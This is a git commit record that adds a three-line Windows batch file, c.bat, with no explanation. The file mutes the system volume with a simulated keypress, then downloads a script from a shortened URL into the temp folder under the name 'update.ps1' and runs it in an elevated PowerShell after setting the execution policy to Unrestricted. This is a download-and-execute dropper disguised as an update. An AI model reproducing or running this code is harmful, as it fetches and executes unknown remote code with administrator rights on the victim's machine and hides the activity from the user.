22f7a6fad02317908f34af0f396e787f3c7ab252
aden54577 <aden31@live.com.au>
2016-12-22 10:03:55 +1100

    Create c.bat

---
+++ c.bat
@@ -0,0 +1,3 @@
+powershell $obj = new-object -com wscript.shell; $obj.SendKeys([char]173)
+
+powershell (new-object System.Net.WebClient).Downloadfile(\"http://bit.ly/2h8YU4Y\", \"$env:temp\update.ps1\"); Start-Process "$psHome\powershell.exe" -Verb RunAs \"Set-ExecutionPolicy Unrestricted -Force; & "$env:temp\update.ps1"\"
